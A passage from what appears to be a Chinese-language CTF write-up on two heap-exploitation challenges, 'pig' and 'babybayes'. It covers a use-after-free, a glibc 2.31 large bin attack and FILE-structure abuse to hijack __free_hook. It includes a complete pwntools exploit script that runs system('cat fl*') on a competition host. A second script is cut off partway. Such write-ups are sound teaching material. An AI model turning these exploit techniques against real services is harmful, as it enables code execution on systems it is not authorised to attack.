class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">save_to_map_3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)global_map + <span class="number">0x2B0</span>, (<span class="type">const</span> <span class="type">void</span> *)a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)global_map + <span class="number">0x370</span>, (<span class="type">const</span> <span class="type">void</span> *)(a1 + <span class="number">0xC0</span>), <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)global_map + <span class="number">0x3E8</span>, (<span class="type">const</span> <span class="type">void</span> *)(a1 + <span class="number">0x138</span>), <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">copy_global_map_2_array_3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)a1, (<span class="type">char</span> *)global_map + <span class="number">0x2B0</span>, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(a1 + <span class="number">0xC0</span>), (<span class="type">char</span> *)global_map + <span class="number">0x370</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(a1 + <span class="number">0x120</span>), (<span class="type">char</span> *)global_map + <span class="number">0x3D0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(a1 + <span class="number">0x138</span>), (<span class="type">char</span> *)global_map + <span class="number">0x3E8</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到这里在进行保存的时候忘记了+0x120偏移位置的数据，而这部分的数据是用来标识当前模式下buf_list中的堆块是否被释放了的。因此这里如果没有进行保存的话，那么在恢复的时候这里的值都是0，而0代表的是buf_list对应的index处的buf未被释放，即仍在使用中，那么这里就出现了一个UAF的漏洞。即切换两次即可对buf进行UAF。</p><p>但是程序中都是calloc，并没有malloc，并且限制了堆块的大小最小为0xa0，也就是这里并不能直接使用tcache实现任意地址分配，而且这里并不能使用fastbin attack。因此这里唯一可以考虑的就是small bin attack和large bin attack。并且这里是GLIBC 2.31 unsorted bin attack已经不能使用了。</p><p>这里在做题的时候犯了一个错误就是没有看好small bin attack是否可行就去尝试了，结果构造完毕堆布局之后发现small bin attack不能使用，这就耗费了很长时间，这里吃一堑长一智吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>不知道当时为什么要尝试这个smallbin attack，感觉没有道理啊。。。</p><p>之后在how2heap看到了large bin attack。这才知道large bin attack在glibc 2.31中还是可以用的。比赛的时候没有仔细的思考，这里详细的看一下。如果在对large bin list插入的堆块小于这个链表中最小的堆块，那么这里会直接插入，并且这里glibc并没有对bk_nextsize的完整性进行检查，直接进行了插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">  fwd = bck;</span><br><span class="line">  bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">  victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">  victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">  fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此这里我们可以覆写bk_nextsize，那么就会将偏移+0x20位置也就是fd_nextsize覆写为插入的victim的地址。那么这里我们就可以任意地址写堆地址了，正常来说这里可以覆写fastbin attack，但是这里存在一个问题就是没办法申请小于0x90大小的堆块（当然这里可以申请后面再说）。</p><p>那么在比赛的时候，我就直接放弃了覆写global_max_fast的做法，那么只剩下一种方法就是覆写IO_list_all然后伪造FILE结构体，这个正好题目给出了一个0xE8的可以写全部内容的堆块（之前的堆块只能写0x10字节的内容）。那么这里很明显就是覆写FILE结构体了。那么这里我的做法就是首先通过UAF覆写tcache的fd指针指向free_hook-0x8的位置。至于地址泄漏的话直接通过UAF就可以泄漏得到。</p><p>伪造FILE结构体之后这里考察的应该就是duet中用到的方法，也是我之前经常使用的方法，就是利用str_overflow函数中的malloc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line"><span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *new_buf;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在比赛中也是才注意到后续还有一个free(old_buf)的方法。但是这里我们一次并不能直接申请到free_hook的堆块的位置。因此这里需要构造两次malloc，这里我是直接将两个FILE结构体放在一个堆块中了，这里还需要利用一下0x10字节的其他堆块的写伪造一下vtable的值。那么这里就可以将两个FILE结构体放在一个0xe8大小的堆块中。</p><p>那么这里第一次malloc用来消耗一个堆块，第二次malloc用来申请到free_hook的堆块，在利用后续的memcpy覆写free_hook，同时利用后续的free函数来触发free_hook。</p><p>但是现在还是存在一个问题就是如何触发 IO_flush。我想到的一个方法就是利用exit函数来触发，但是找遍了程序只发现当check_pass输入的字符串长度是0的时候才会触发exit，这就需要我们shutdown(“send”)，那么这里就不能弹shell。这里我是直接执行的cat fl*\x00这样输出flag。</p><p>这里看了官方的wp，这里直接sendlineafter(“\n”)就可以是的长度是0。因为在check_pass输入的时候直接将\n替换为了0。同时这里官方想要考察的是利用IO_str_overflow来减缓tcache stashing unlink的使用难度。也就是说首先利用tcache stashing unlink在tcache中放置一个伪造的堆块，在之后利用IO_str_overflow中的malloc申请到伪造的堆块，覆写free_hook完成利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pig&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0xe6e73</span>, <span class="number">0xe6e76</span>, <span class="number">0xe6e79</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.35.8.11&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">init_count = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, input_content=init_count</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_content) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(size / <span class="number">48</span>)):</span><br><span class="line">            p.sendline()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(size / <span class="number">48</span>)):</span><br><span class="line">            p.send(input_content[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, input_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_content) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(size / <span class="number">48</span>)):</span><br><span class="line">            p.sendline()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> con <span class="keyword">in</span> input_content:</span><br><span class="line">            p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    passwd = [<span class="string">&quot;AADCGTDO&quot;</span>, <span class="string">&quot;BAAZSAVR&quot;</span>, <span class="string">&quot;CAAUGNJT&quot;</span>]</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;corresponding user:\n&quot;</span>, passwd[index - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_content</span>(<span class="params">size, content</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(size / <span class="number">48</span>)):</span><br><span class="line">        res.append(content)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span> - i)</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x428</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;message is: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xf0</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message is: &quot;</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_address)*<span class="number">2</span></span><br><span class="line">add(<span class="number">0x90</span>, gen_content(<span class="number">0x90</span>, payload))</span><br><span class="line">add(<span class="number">0x418</span>)</span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x438</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_address + <span class="number">0x3b0</span>) + p64(libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, gen_content(<span class="number">0x428</span>, payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x438</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x418</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, gen_content(<span class="number">0x428</span>, p64(heap_address + <span class="number">0x3b0</span>)*<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x438)</span></span><br><span class="line">add(<span class="number">0x438</span>)</span><br><span class="line"></span><br><span class="line">io_str_jumps = libc.address + <span class="number">0x1ed560</span></span><br><span class="line">_chain = heap_address + <span class="number">0x3b0</span> + <span class="number">0x60</span></span><br><span class="line">value_address = _chain + <span class="number">0xa0</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_FILE = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_FILE += p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_FILE += p64(<span class="number">0</span>) + p64(<span class="built_in">int</span>((<span class="number">0x90</span> - <span class="number">100</span>) / <span class="number">2</span>))</span><br><span class="line">fake_FILE = fake_FILE.ljust(<span class="number">0x68</span> - <span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_FILE += p64(_chain) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_FILE += p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_FILE += p64(value_address) + p64(value_address + <span class="built_in">int</span>((<span class="number">0x90</span> - <span class="number">100</span>) / <span class="number">2</span>))</span><br><span class="line">fake_FILE += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(heap_address)</span><br><span class="line">fake_FILE = fake_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_FILE += p64(io_str_jumps)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>, fake_FILE)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = p64(io_str_jumps)*<span class="number">2</span></span><br><span class="line">add(<span class="number">0x90</span>, gen_content(<span class="number">0x90</span>, payload))</span><br><span class="line">add(<span class="number">0x90</span>, gen_content(<span class="number">0x90</span>, <span class="string">b&quot;cat fl*\x00&quot;</span> + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">edit(<span class="number">1</span>, gen_content(<span class="number">0x90</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x8</span>)*<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babybayes"><a href="#babybayes" class="headerlink" title="babybayes"></a>babybayes</h2><p>是一个机器学习的模型，可以创建/删除模型，也可以train/predict模型。程序的漏洞是黑盒测试出来的，也即是当train输入矩阵的时候如果输入-1则会存在上溢出，此时会对堆块的size+1。相当于我们可以伪造size。这里一个模型的结构体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Bayes           struc ; (sizeof=<span class="number">0x60</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> alpha_n         dq ?</span><br><span class="line">00000008 total_num_train_data dq ?</span><br><span class="line"><span class="number">000000</span>10 count_for_each_label Vector&lt;int64&gt; ?</span><br><span class="line">00000028 count_of_words_for_each_label Vector&lt;int64&gt; ?</span><br><span class="line">00000040 count_of_each_word_for_each_label Vector&lt;Vector&lt;int64&gt; &gt; ?</span><br><span class="line">00000058 total_num_words dq ?</span><br><span class="line">00000060 Bayes           ends</span><br></pre></td></tr></table></figure><p>这里使用的是多个vector来描述一个模型，在对count_of_each_word_for_each_label输出的时候会首先判断count_for_each_label vector的长度。那么这里我们可以伪造size构造堆重叠，进而实现覆写模型的vector指针，这里为了绕过检查（即对count_of_each_word_for_each_label输出时可能会造成越界）那么这里将count_for_each_label的vector全部覆写为0，这样count_of_each_word_for_each_label就不会输出了。然后覆写count_of_words_for_each_label begin也就是开始输出内容的起始地址的低1字节。之后就可以输出堆中的一些信息了。那么这里提前布局好之后就可以泄漏出libc基地址和heap的地址了。</p><p>之后就是如何覆写的问题，这里使用的是train中的string实现堆块的分配和覆写第1字节的内容。在之后覆写free_hook和tcache 的fd的时候可以直接申请模型，由于其fd处存储的是一个模型的参数，是我们完全可以控制的，因此这里可以直接覆写fd，覆写free_hook，并且在释放的时候可以直接调用system(“/bin/sh”)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> syslog</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./bayes&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.35.8.14&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    libc = ELF(<span 